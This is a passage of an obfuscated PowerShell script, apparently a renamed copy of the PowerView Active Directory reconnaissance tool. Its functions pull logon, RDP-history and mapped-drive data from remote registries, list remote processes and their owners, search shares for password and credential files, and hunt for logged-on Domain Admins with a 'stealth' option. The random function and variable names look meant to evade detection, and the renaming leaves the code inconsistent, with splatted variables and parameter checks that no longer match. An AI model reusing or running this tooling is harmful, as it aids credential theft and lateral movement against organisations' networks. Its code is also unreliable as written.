    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            $HKLM = 2147483650
            $UHCsPbRc99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $aJJGHudX99
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $UHCsPbRc99['Credential'] = $fxunRYJT99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $GNDAGmLB99 = $Reg.GetStringValue($HKLM, $Key, $Value).sValue
                $JuodxqDF99 = New-Object PSObject
                $JuodxqDF99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                $JuodxqDF99 | Add-Member Noteproperty 'LastLoggedOn' $GNDAGmLB99
                $JuodxqDF99.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $JuodxqDF99
            }
            catch {
                Write-Warning "[Nash] Error opening remote registry on $aJJGHudX99. Remote registry likely not enabled."
            }
        }
    }
}
function rambles {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            $HKU = 2147483651
            $UHCsPbRc99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $aJJGHudX99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $UHCsPbRc99['Credential'] = $fxunRYJT99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $VndtnLQi99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($SbQTXIQw99 in $VndtnLQi99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $pgSynGHL99 = dotcom -xcFWvzAE99 $SbQTXIQw99 -fxunRYJT99 $fxunRYJT99
                        }
                        else {
                            $pgSynGHL99 = dotcom -xcFWvzAE99 $SbQTXIQw99
                        }
                        $zWJIXrnX99 = $Reg.EnumValues($HKU,"$SbQTXIQw99\Software\Microsoft\Terminal Server Client\Default").sNames
                        ForEach ($rYNgUWJy99 in $zWJIXrnX99) {
                            if ($rYNgUWJy99 -match 'MRU.*') {
                                $JBMoXZDu99 = $Reg.GetStringValue($HKU, "$SbQTXIQw99\Software\Microsoft\Terminal Server Client\Default", $rYNgUWJy99).sValue
                                $pEhIKlqa99 = New-Object PSObject
                                $pEhIKlqa99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                                $pEhIKlqa99 | Add-Member Noteproperty 'UserName' $pgSynGHL99
                                $pEhIKlqa99 | Add-Member Noteproperty 'UserSID' $SbQTXIQw99
                                $pEhIKlqa99 | Add-Member Noteproperty 'TargetServer' $JBMoXZDu99
                                $pEhIKlqa99 | Add-Member Noteproperty 'UsernameHint' $Null
                                $pEhIKlqa99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $pEhIKlqa99
                            }
                        }
                        $ZmDQGXrj99 = $Reg.EnumKey($HKU,"$SbQTXIQw99\Software\Microsoft\Terminal Server Client\Servers").sNames
                        ForEach ($YBAlGqrU99 in $ZmDQGXrj99) {
                            $QmZiGUPz99 = $Reg.GetStringValue($HKU, "$SbQTXIQw99\Software\Microsoft\Terminal Server Client\Servers\$YBAlGqrU99", 'UsernameHint').sValue
                            $pEhIKlqa99 = New-Object PSObject
                            $pEhIKlqa99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                            $pEhIKlqa99 | Add-Member Noteproperty 'UserName' $pgSynGHL99
                            $pEhIKlqa99 | Add-Member Noteproperty 'UserSID' $SbQTXIQw99
                            $pEhIKlqa99 | Add-Member Noteproperty 'TargetServer' $YBAlGqrU99
                            $pEhIKlqa99 | Add-Member Noteproperty 'UsernameHint' $QmZiGUPz99
                            $pEhIKlqa99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $pEhIKlqa99
                        }
                    }
                    catch {
                        Write-Verbose "[rambles] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[rambles] Error accessing $aJJGHudX99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function hypercritical {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            $HKU = 2147483651
            $UHCsPbRc99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $aJJGHudX99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $UHCsPbRc99['Credential'] = $fxunRYJT99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $VndtnLQi99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($SbQTXIQw99 in $VndtnLQi99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $pgSynGHL99 = dotcom -xcFWvzAE99 $SbQTXIQw99 -fxunRYJT99 $fxunRYJT99
                        }
                        else {
                            $pgSynGHL99 = dotcom -xcFWvzAE99 $SbQTXIQw99
                        }
                        $hBoqfiXu99 = ($Reg.EnumKey($HKU, "$SbQTXIQw99\Network")).sNames
                        ForEach ($JyGLPsfm99 in $hBoqfiXu99) {
                            $wlHqKNOj99 = $Reg.GetStringValue($HKU, "$SbQTXIQw99\Network\$JyGLPsfm99", 'ProviderName').sValue
                            $RPOIStFh99 = $Reg.GetStringValue($HKU, "$SbQTXIQw99\Network\$JyGLPsfm99", 'RemotePath').sValue
                            $gtbrSqwr99 = $Reg.GetStringValue($HKU, "$SbQTXIQw99\Network\$JyGLPsfm99", 'UserName').sValue
                            if (-not $pgSynGHL99) { $pgSynGHL99 = '' }
                            if ($RPOIStFh99 -and ($RPOIStFh99 -ne '')) {
                                $ZPPjhAzQ99 = New-Object PSObject
                                $ZPPjhAzQ99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                                $ZPPjhAzQ99 | Add-Member Noteproperty 'UserName' $pgSynGHL99
                                $ZPPjhAzQ99 | Add-Member Noteproperty 'UserSID' $SbQTXIQw99
                                $ZPPjhAzQ99 | Add-Member Noteproperty 'DriveLetter' $JyGLPsfm99
                                $ZPPjhAzQ99 | Add-Member Noteproperty 'ProviderName' $wlHqKNOj99
                                $ZPPjhAzQ99 | Add-Member Noteproperty 'RemotePath' $RPOIStFh99
                                $ZPPjhAzQ99 | Add-Member Noteproperty 'DriveUserName' $gtbrSqwr99
                                $ZPPjhAzQ99.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $ZPPjhAzQ99
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[hypercritical] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[hypercritical] Error accessing $aJJGHudX99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function keels {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            try {
                $UHCsPbRc99 = @{
                    'ComputerName' = $FRrsCtDf99
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $UHCsPbRc99['Credential'] = $fxunRYJT99 }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $biykNbRr99 = New-Object PSObject
                    $biykNbRr99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                    $biykNbRr99 | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $biykNbRr99 | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $biykNbRr99 | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $biykNbRr99 | Add-Member Noteproperty 'User' $Owner.User
                    $biykNbRr99.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $biykNbRr99
                }
            }
            catch {
                Write-Verbose "[keels] Error enumerating remote processes on '$aJJGHudX99', access likely denied: $_"
            }
        }
    }
}
function heyday {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $locydHbE99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $cZehrTYi99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $RXjqZVXz99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $jZwVGUVo99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $LRmLsTwY99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FWOqsNsz99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $HpnMWKRF99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $XgZvFNWC99,
        [Switch]
        $QbPKbnJq99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $sMQTvMNR99 =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $locydHbE99
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $sMQTvMNR99['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            $cZehrTYi99 = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $sMQTvMNR99['Include'] = @('*.exe')
        }
        $sMQTvMNR99['Force'] = -not $PSBoundParameters['ExcludeHidden']
        $FfETXugp99 = @{}
        function perspiring {
            [CmdletBinding()]Param([String]$Path)
            try {
                $ZAMddyFx99 = [IO.File]::OpenWrite($Path)
                $ZAMddyFx99.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach ($JetVKPlT99 in $Path) {
            if (($JetVKPlT99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $eNGCfBcN99 = (New-Object System.Uri($JetVKPlT99)).Host
                if (-not $FfETXugp99[$eNGCfBcN99]) {
                    Staci -FRrsCtDf99 $eNGCfBcN99 -fxunRYJT99 $fxunRYJT99
                    $FfETXugp99[$eNGCfBcN99] = $True
                }
            }
            $sMQTvMNR99['Path'] = $JetVKPlT99
            Get-ChildItem @SearcherArguments | ForEach-Object {
                $XrecexFG99 = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $XrecexFG99 = $False
                }
                if ($cZehrTYi99 -and ($_.LastAccessTime -lt $cZehrTYi99)) {
                    $XrecexFG99 = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $RXjqZVXz99)) {
                    $XrecexFG99 = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $jZwVGUVo99)) {
                    $XrecexFG99 = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (perspiring -Path $_.FullName))) {
                    $XrecexFG99 = $False
                }
                if ($XrecexFG99) {
                    $wQdasbuZ99 = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $McYtlSfB99 = New-Object -TypeName PSObject -Property $wQdasbuZ99
                    $McYtlSfB99.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $McYtlSfB99
                }
            }
        }
    }
    END {
        $FfETXugp99.Keys | outsmarts
    }
}
function liable {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $FRrsCtDf99,
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $qufpOQjV99,
        [Parameter(Position = 2)]
        [Hashtable]
        $KaKNBSkt99,
        [Int]
        [ValidateRange(1,  100)]
        $OVPWEKQH99 = 20,
        [Switch]
        $cvGGsceL99
    )
    BEGIN {
        $RZuuScUb99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $RZuuScUb99.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not $cvGGsceL99) {
            $bZSpewze99 = Get-Variable -Scope 2
            $zsPQvWcE99 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
            ForEach ($Var in $bZSpewze99) {
                if ($zsPQvWcE99 -NotContains $Var.Name) {
                $RZuuScUb99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }
            ForEach ($mhMrjmBN99 in (Get-ChildItem Function:)) {
                $RZuuScUb99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $mhMrjmBN99.Name, $mhMrjmBN99.Definition))
            }
        }
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $OVPWEKQH99, $RZuuScUb99, $Host)
        $Pool.Open()
        $fQOJfqWf99 = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $PAJqOgbU99 = $M.GetParameters()
            if (($PAJqOgbU99.Count -eq 2) -and $PAJqOgbU99[0].Name -eq 'input' -and $PAJqOgbU99[1].Name -eq 'output') {
                $fQOJfqWf99 = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }
        $Jobs = @()
        $FRrsCtDf99 = $FRrsCtDf99 | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[liable] Total number of hosts: $($FRrsCtDf99.count)"
        if ($OVPWEKQH99 -ge $FRrsCtDf99.Length) {
            $OVPWEKQH99 = $FRrsCtDf99.Length
        }
        $uxzjrJeL99 = [Int]($FRrsCtDf99.Length/$OVPWEKQH99)
        $ibLdBTtO99 = @()
        $Start = 0
        $End = $uxzjrJeL99
        for($i = 1; $i -le $OVPWEKQH99; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $OVPWEKQH99) {
                $End = $FRrsCtDf99.Length
            }
            $List.AddRange($FRrsCtDf99[$Start..($End-1)])
            $Start += $uxzjrJeL99
            $End += $uxzjrJeL99
            $ibLdBTtO99 += @(,@($List.ToArray()))
        }
        Write-Verbose "[liable] Total number of threads/partitions: $OVPWEKQH99"
        ForEach ($XKcgXnfQ99 in $ibLdBTtO99) {
            $CtJKSRSw99 = [PowerShell]::Create()
            $CtJKSRSw99.runspacepool = $Pool
            $Null = $CtJKSRSw99.AddScript($qufpOQjV99).AddParameter('ComputerName', $XKcgXnfQ99)
            if ($KaKNBSkt99) {
                ForEach ($Param in $KaKNBSkt99.GetEnumerator()) {
                    $Null = $CtJKSRSw99.AddParameter($Param.Name, $Param.Value)
                }
            }
            $MZchCEdW99 = New-Object Management.Automation.PSDataCollection[Object]
            $Jobs += @{
                PS = $CtJKSRSw99
                Output = $MZchCEdW99
                Result = $fQOJfqWf99.Invoke($CtJKSRSw99, @($Null, [Management.Automation.PSDataCollection[Object]]$MZchCEdW99))
            }
        }
    }
    END {
        Write-Verbose "[liable] Threads executing"
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
        $sGnDXwfO99 = 100
        Write-Verbose "[liable] Waiting $sGnDXwfO99 seconds for final cleanup..."
        for ($i=0; $i -lt $sGnDXwfO99; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }
        $Pool.Dispose()
        Write-Verbose "[liable] all threads completed"
    }
}
function Rich {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $FRrsCtDf99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [String]
        $dZsWzroh99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aXAjpBZF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ylCWjnDC99,
        [Alias('Unconstrained')]
        [Switch]
        $gLTiFMlP99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hmaWUxwb99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $dxKxxCOP99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gnqgCtNx99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $DGKWisJq99,
        [ValidateNotNullOrEmpty()]
        [String]
        $NzTnTiPA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $rjXhRXOy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $uMeRoqnN99,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ixnbeNsM99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $CbRuRoHr99,
        [Alias('AllowDelegation')]
        [Switch]
        $RGreChEi99,
        [Switch]
        $tTmpBjDH99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $YjZHzKFA99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $WfsvHBIT99 = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $JyVCApoo99,
        [Switch]
        $BCRKPOeL99,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $BuVsrvMf99 = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $OVPWEKQH99 = 20
    )
    BEGIN {
        $AiVkGjhl99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $AiVkGjhl99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['ComputerDomain']) { $AiVkGjhl99['Domain'] = $dZsWzroh99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $AiVkGjhl99['LDAPFilter'] = $aXAjpBZF99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $AiVkGjhl99['SearchBase'] = $ylCWjnDC99 }
        if ($PSBoundParameters['Unconstrained']) { $AiVkGjhl99['Unconstrained'] = $ynilECNu99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $AiVkGjhl99['OperatingSystem'] = $fvZEnbGC99 }
        if ($PSBoundParameters['ComputerServicePack']) { $AiVkGjhl99['ServicePack'] = $fGspowYC99 }
        if ($PSBoundParameters['ComputerSiteName']) { $AiVkGjhl99['SiteName'] = $DgPmuXLw99 }
        if ($PSBoundParameters['Server']) { $AiVkGjhl99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $AiVkGjhl99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $AiVkGjhl99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AiVkGjhl99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $AiVkGjhl99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $AiVkGjhl99['Credential'] = $fxunRYJT99 }
        $obYNFcTp99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $obYNFcTp99['Identity'] = $DGKWisJq99 }
        if ($PSBoundParameters['Domain']) { $obYNFcTp99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['UserDomain']) { $obYNFcTp99['Domain'] = $NzTnTiPA99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $obYNFcTp99['LDAPFilter'] = $rjXhRXOy99 }
        if ($PSBoundParameters['UserSearchBase']) { $obYNFcTp99['SearchBase'] = $uMeRoqnN99 }
        if ($PSBoundParameters['UserAdminCount']) { $obYNFcTp99['AdminCount'] = $CbRuRoHr99 }
        if ($PSBoundParameters['UserAllowDelegation']) { $obYNFcTp99['AllowDelegation'] = $RGreChEi99 }
        if ($PSBoundParameters['Server']) { $obYNFcTp99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $obYNFcTp99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $obYNFcTp99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $obYNFcTp99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $obYNFcTp99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $obYNFcTp99['Credential'] = $fxunRYJT99 }
        $LhPthbPt99 = @()
        if ($PSBoundParameters['ComputerName']) {
            $LhPthbPt99 = @($FRrsCtDf99)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[Rich] Stealth enumeration using source: $BuVsrvMf99"
                $xmgWrhWO99 = New-Object System.Collections.ArrayList
                if ($BuVsrvMf99 -match 'File|All') {
                    Write-Verbose '[Rich] Querying for file servers'
                    $oeVlbbFT99 = @{}
                    if ($PSBoundParameters['Domain']) { $oeVlbbFT99['Domain'] = $UtXBFQsM99 }
                    if ($PSBoundParameters['ComputerDomain']) { $oeVlbbFT99['Domain'] = $dZsWzroh99 }
                    if ($PSBoundParameters['ComputerSearchBase']) { $oeVlbbFT99['SearchBase'] = $ylCWjnDC99 }
                    if ($PSBoundParameters['Server']) { $oeVlbbFT99['Server'] = $YBAlGqrU99 }
                    if ($PSBoundParameters['SearchScope']) { $oeVlbbFT99['SearchScope'] = $daZTeEQR99 }
                    if ($PSBoundParameters['ResultPageSize']) { $oeVlbbFT99['ResultPageSize'] = $JFYciBwT99 }
                    if ($PSBoundParameters['ServerTimeLimit']) { $oeVlbbFT99['ServerTimeLimit'] = $qaKJUqzZ99 }
                    if ($PSBoundParameters['Tombstone']) { $oeVlbbFT99['Tombstone'] = $mIpZvziV99 }
                    if ($PSBoundParameters['Credential']) { $oeVlbbFT99['Credential'] = $fxunRYJT99 }
                    $kncbUqCy99 = nitrated @FileServerSearcherArguments
                    if ($kncbUqCy99 -isnot [System.Array]) { $kncbUqCy99 = @($kncbUqCy99) }
                    $xmgWrhWO99.AddRange( $kncbUqCy99 )
                }
                if ($BuVsrvMf99 -match 'DFS|All') {
                    Write-Verbose '[Rich] Querying for DFS servers'
                }
                if ($BuVsrvMf99 -match 'DC|All') {
                    Write-Verbose '[Rich] Querying for domain controllers'
                    $EDDYLulN99 = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $EDDYLulN99['Domain'] = $UtXBFQsM99 }
                    if ($PSBoundParameters['ComputerDomain']) { $EDDYLulN99['Domain'] = $dZsWzroh99 }
                    if ($PSBoundParameters['Server']) { $EDDYLulN99['Server'] = $YBAlGqrU99 }
                    if ($PSBoundParameters['Credential']) { $EDDYLulN99['Credential'] = $fxunRYJT99 }
                    $cybnGRRM99 = pizzicatos @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($cybnGRRM99 -isnot [System.Array]) { $cybnGRRM99 = @($cybnGRRM99) }
                    $xmgWrhWO99.AddRange( $cybnGRRM99 )
                }
                $LhPthbPt99 = $xmgWrhWO99.ToArray()
            }
            else {
                Write-Verbose '[Rich] Querying for all computers in the domain'
                $LhPthbPt99 = sensationalist @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Rich] TargetComputers length: $($LhPthbPt99.Length)"
        if ($LhPthbPt99.Length -eq 0) {
            throw '[Rich] No hosts found to enumerate'
        }
        if ($PSBoundParameters['Credential']) {
            $ZVVXqHOv99 = $fxunRYJT99.GetNetworkCredential().UserName
        }
        else {
            $ZVVXqHOv99 = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters['ShowAll']) {
            $TIUIlEVH99 = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TIUIlEVH99 = threatened @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $IHABlwZD99 = @{
                'Identity' = $ixnbeNsM99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $IHABlwZD99['Domain'] = $NzTnTiPA99 }
            if ($PSBoundParameters['UserSearchBase']) { $IHABlwZD99['SearchBase'] = $uMeRoqnN99 }
            if ($PSBoundParameters['Server']) { $IHABlwZD99['Server'] = $YBAlGqrU99 }
            if ($PSBoundParameters['SearchScope']) { $IHABlwZD99['SearchScope'] = $daZTeEQR99 }
            if ($PSBoundParameters['ResultPageSize']) { $IHABlwZD99['ResultPageSize'] = $JFYciBwT99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $IHABlwZD99['ServerTimeLimit'] = $qaKJUqzZ99 }
            if ($PSBoundParameters['Tombstone']) { $IHABlwZD99['Tombstone'] = $mIpZvziV99 }
            if ($PSBoundParameters['Credential']) { $IHABlwZD99['Credential'] = $fxunRYJT99 }
            $TIUIlEVH99 = monkeying @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        Write-Verbose "[Rich] TargetUsers length: $($TIUIlEVH99.Length)"
        if ((-not $JyVCApoo99) -and ($TIUIlEVH99.Length -eq 0)) {
            throw '[Rich] No users found to target'
        }
        $xMDBlffj99 = {
            Param($FRrsCtDf99, $TIUIlEVH99, $ZVVXqHOv99, $BCRKPOeL99, $TtWrEMPZ99)
            if ($TtWrEMPZ99) {
                $Null = departs -TtWrEMPZ99 $TtWrEMPZ99 -Quiet
            }
            ForEach ($sKWGHAjO99 in $FRrsCtDf99) {
                $Up = Test-Connection -Count 1 -Quiet -FRrsCtDf99 $sKWGHAjO99
                if ($Up) {
